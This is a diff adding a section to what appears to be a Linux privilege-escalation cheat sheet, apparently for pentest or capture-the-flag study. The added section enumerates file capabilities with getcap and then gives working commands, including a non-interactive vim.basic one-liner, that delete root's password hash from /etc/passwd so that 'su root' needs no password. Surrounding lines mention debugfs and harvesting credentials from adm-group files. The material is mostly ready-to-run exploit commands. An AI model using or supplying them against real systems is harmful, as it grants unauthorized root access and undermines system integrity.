@@ -70,6 +70,26 @@ Use debugfs on /dev/sda1 → same impact as root
 bashfind / -group adm -type f 2>/dev/null
 No direct root, but leaks creds, cron jobs, user activity
 ```
+##Capabilities privilage
+
+```
+Enumerating Capabilities
+
+ find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
+Bypass all file permission checks → read/write any file as root
+Exploit — Edit /etc/passwd
+Interactive:
+bashvim.basic /etc/passwd
+# Remove root's password hash, then :w!
+One-liner (non-interactive):
+bashecho -e ':%s/^root:[^:]*:/root::/\nwq!' | vim.basic -es /etc/passwd
+This removes root's password → now su root needs no password
+Verify:
+bashcat /etc/passwd | head -n1
+# root::0:0:root:/root:/bin/bash  ← empty password = success
+su root
+
+```
 
 ##needrestart v3.7
 ```
